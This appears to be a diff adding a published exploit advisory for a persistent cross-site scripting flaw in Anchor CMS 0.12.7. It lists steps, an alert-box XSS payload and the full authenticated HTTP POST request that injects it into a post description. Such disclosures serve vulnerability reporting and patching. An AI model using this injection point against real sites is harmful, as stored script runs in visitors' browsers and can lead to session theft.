@@ -1,0 +1,39 @@
+# Exploit Title: Anchor CMS 0.12.7 - Persistent Cross-Site Scripting (Authenticated)
+# Date: 2020-09-24
+# Exploit Author: Sinem Şahin
+# Vendor Homepage: https://anchorcms.com/
+# Version: 0.12.7
+# Tested on: Windows & XAMPP
+
+==> Tutorial <==
+
+1- Go to the following url. => http://(HOST)/admin/
+2- Login to admin panel.
+3- Press "Posts" button.
+4- Write XSS Payload into the description of the post.
+5- Press "Save" button.
+6- Go to the post.
+
+XSS Payload ==> "><script>alert("XSS")</script>
+
+==> HTTP Request <==
+
+POST /admin/posts/edit/1 HTTP/1.1
+Host: (HOST)
+Content-Length: 262
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded
+Accept: /
+Origin: http://(HOST)/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://(HOST)/admin/posts/edit/1
+Accept-Encoding: gzip, deflate
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: anchorcms=21cdfqefqwefl69ij8231
+Connection: close
+
+token=mWgKk1tbYN6HAcj0jr6K2VKxBf6C311uemwTIrmEaHIi0zQpe7pNfHVm7zcoa3Fi&title=Post+Title&markdown=%0A&slug=hello-world&created=2020-09-24%2019%3A07%3A10
+&description=%22%3E%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E&status=published&category=1&css=&js=&autosave=false
